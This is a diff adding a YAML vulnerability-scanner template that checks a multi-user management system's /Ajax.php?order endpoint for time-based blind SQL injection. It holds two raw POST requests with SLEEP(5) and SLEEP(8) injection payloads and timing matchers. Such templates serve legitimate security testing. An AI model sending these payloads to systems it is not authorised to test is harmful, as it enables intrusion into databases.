@@ -1,0 +1,39 @@
+id: poc-yaml-api-interface-call-mums-ajax-sqli
+info:
+  name: "多用户管理系统 Ajax.php SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 多用户管理系统
+
+http:
+  - raw:
+      - |
+        POST /Ajax.php?order HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+        
+        id=11' AND (SELECT 1465 FROM (SELECT(SLEEP(5)))sMaC)-- Gxag
+      - |
+        POST /Ajax.php?order HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+        
+        id=11' AND (SELECT 1465 FROM (SELECT(SLEEP(8)))sMaC)-- Gxag
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"msg\":\"succ\""
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
